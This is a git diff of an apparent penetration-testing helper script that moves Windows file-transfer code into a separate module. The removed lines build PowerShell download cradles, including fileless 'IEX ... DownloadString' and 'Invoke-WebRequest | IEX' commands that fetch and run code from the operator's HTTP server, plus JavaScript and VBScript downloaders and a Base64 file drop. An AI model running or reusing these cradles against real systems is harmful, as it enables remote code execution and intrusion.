@@ -15,6 +15,7 @@ path.append('modules')
 import helpers
 import services
 import linuxdo
+import windowsdo
 
 # UPLOAD TO WINDOW TARGET METHODS
 UploadTo_WinMethods = [
@@ -37,19 +38,6 @@ UploadFrom_WinMethods = [
     # 'WebDAV',
 ]
 
-# POWERSHELL UPLOAD TO, METHODS
-PSTo_Methods = [
-    'Invoke-WebRequest',
-    'Invoke-WebRequest - Fileless',
-    # 'DownloadFile',                   # CURRENTLY NOT WORKING
-    'DownloadString - Fileless'
-]
-
-# POWERSHELL UPLOAD FROM, METHODS
-PSFrom_Methods = [
-    'PSUpload.ps1',
-    'Base64'
-]
 
 # UPLOAD TO LINUX TARGET METHODS
 UploadTo_NixMethods = [
@@ -103,19 +91,6 @@ def run_command(args):
         print('[+] Running gobuster vhost on ' + args.target_url)
         subprocess.run([['gobuster', 'vhost', '-u', args.target_url, '-w', '/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt', '>', args.target_url+'.gbvhost']])
 
-# GENERATE AND VERIFY HASH
-def verify_hash(relpath):
-    original_md5 = hashlib.md5(open(relpath, 'rb').read()).hexdigest()
-    try:
-        print('[?] Paste MD5 checksum output here to compare: ', end='')
-        remote_md5 = input()
-        if original_md5 == remote_md5:
-            print('[+] MD5 checksum matches! You\'re good to go.')
-        else:
-            print('[-] Uh-oh... MD5 checksum doesn\'t match. Try again.')
-    except KeyboardInterrupt:
-        exit(0)
-
 # CREATE A REVERSE, BIND, OR WEB SHELL PAYLOAD
 def create_payload(args):
     if args.shell == 'bind':
@@ -162,10 +137,6 @@ def create_payload(args):
 
 # UPLOAD FILES TO
 def upload_to(args):
-    # SEPARATE RELATIVE PATH TO FILE FROM FILENAME ITSELF
-    relpath = args.filename
-    args.filename = os.path.basename(os.path.normpath(args.filename))
-
     # GENERATE RANDOM FILENAME FOR EXTREMELY MINIMAL FILE OBFUSCATION
     rand_filename = ''.join(random.choices(string.ascii_letters, k=8))
 
@@ -179,105 +150,14 @@ def upload_to(args):
         # METHOD SELECTION
         method = helpers.populateChoices(entrymsg, UploadTo_WinMethods)
 
-        ###########################
-        ### WINDOWS HTTP METHOD ###
-        ###########################
         if method == 'HTTP':
-            proc, listenIP, listenPort = services.startHTTP()
-            
-            # PASTABLES
-            entrymsg = '[+] Select windows target download method:'
-            choice = helpers.populateChoices(entrymsg, PSTo_Methods)
-            if choice == 'DownloadFile':
-                print('[+] DownloadFile method selected')
-                print('[?] Sync or Async [default=sync]: ', end='')
-                try:
-                    sync = input().lower()
-                except KeyboardInterrupt:
-                    pyserver.terminate()
-                    exit(0)
-                if sync == '':
-                    sync = 'sync'
-                if sync == 'async':
-                    print('[+] Using Asynchronous DownloadFile')
-                    startcmd = '(New-Object Net.WebClient).DownloadFileAsync(\'http://' + listenIP + ':' + listenPort + '/' + args.filename + '\',\'' + rand_filename + '\')'
-                    endcmd = ''
-                elif sync == 'sync':
-                    print('[+] Using Synchronous DownloadFile')
-                    startcmd = '(New-Object Net.WebClient).DownloadFile(\'http://' + listenIP + ':' + listenPort + '/' + args.filename + '\',\'' + rand_filename + '\')'
-                    endcmd = ''
-            elif choice == 'DownloadString - Fileless':
-                print('[+] DownloadString - Fileless method selected')
-                choice = random.randint(1, 2)
-                if choice == '1':
-                    startcmd = 'IEX (New-Object Net.WebClient).DownloadString(\'http://' + listenIP + ':' + listenPort + '/' + args.filename + '\')'
-                    endcmd = ''
-                else:
-                    startcmd = '(New-Object Net.WebClient).DownloadString(\'http://' + listenIP + ':' + listenPort + '/' + args.filename
-                    endcmd = '\') | IEX'
-            elif choice == 'Invoke-WebRequest':
-                print('[+] Invoke-WebRequest method selected')
-                startcmd = 'Invoke-WebRequest http://' + listenIP + ':' + listenPort + '/' + args.filename
-                endcmd = ' -OutFile ' + rand_filename
-            elif choice == 'Invoke-WebRequest - Fileless':
-                print('[+] Invoke-WebRequest - Fileless method selected')
-                startcmd = 'Invoke-WebRequest http://' + listenIP + ':' + listenPort + '/' + args.filename
-                endcmd = ' | IEX'
-            elif choice == 'JavaScript':
-                print('[+] JavaScript method selected')
-                cmd = '\$file = \'var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");\'\n'
-                cmd += '\$file = \'WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);\'\n'
-                cmd += '\$file = \'WinHttpReq.Send();\'\n'
-                cmd += '\$file = \'BinStream = new ActiveXObject("ADODB.Stream");\'\n'
-                cmd += '\$file = \'BinStream.Type = 1;\'\n'
-                cmd += '\$file = \'BinStream.Open();\'\n'
-                cmd += '\$file = \'BinStream.Write(WinHttpReq.ResponseBody);\'\n'
-                cmd += '\$file = \'BinStream.SaveToFile(WScript.Arguments(1));\''
-                cmd += '\$file | Out-File get.js;'
-                cmd += 'cscript.exe /nologo get.js http://' + listenIP + ':' + listenPort + '/' + args.filename + ' ' + args.filename
-            elif choice == 'VBScript':
-                print('[+] VBScript method selected')
-                cmd = '\$file = \'dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")\'\n'
-                cmd += '\$file = \'dim bStrm: Set bStrm = createobject("Adodb.Stream")\'\n'
-                cmd += '\$file = \'xHttp.Open "GET", WScript.Arguments.Item(0), False\'\n'
-                cmd += '\$file = \'xHttp.Send\'\n\n'
-                cmd += '\$file = \'with bStrm\'\n'
-                cmd += '\$file = \'    .type = 1\'\n'
-                cmd += '\$file = \'    .open\'\n'
-                cmd += '\$file = \'    .write xHttp.responseBody\'\n'
-                cmd += '\$file = \'    .savetofile WScript.Arguments.Item(1), 2\'\n'
-                cmd += '\$file = \'end with\';'
-                cmd += '\$file | Out-File get.vbs'
-                cmd += 'cscript.exe /nologo get.vbs http://' + listenIP + ':' + listenPort + '/' + args.filename + ' ' + args.filename
-
-            else:
-                print('[!] Invalid choice')
-            cmd = startcmd + endcmd
-            os.link(relpath, '/tmp/webroot/' + args.filename)
-            helpers.pasta(cmd)
-            services.stopHTTP(proc)
-
-            # if args.firstlaunch:
-            #     command = startcmd + ' -UseBasicParsing' + endcmd
-            # if args.trust:
-            #     print('[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}')
+            windowsdo.httpUploadTo(args.filename)
 
         #############################    
         ### WINDOWS BASE64 METHOD ###
         #############################
         elif method == 'Base64':
-            print('[+] Generating Base64 string of file')
-            cmd = 'cat ' + relpath + ' | base64 -w 0'
-            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
-            b64 = proc.stdout.decode()
-            print('[+] Run this command on target')
-
-            cmd = '[IO.File]::WriteAllBytes(\"' + '.\", [Convert]::FromBase64String(\"' + b64 + '")); Get-FileHash ' + args.filename + ' -Algorithm md5'
-            if len(cmd) > 8191:
-                print('[!] cmd.exe has a maximum string length of 8,191 characters.')
-                exit(0)
-
-            verify_hash(relpath)
+            windowsdo.base64UploadTo(args.filename)
 
         ##########################
         ### WINDOWS SCP METHOD ###
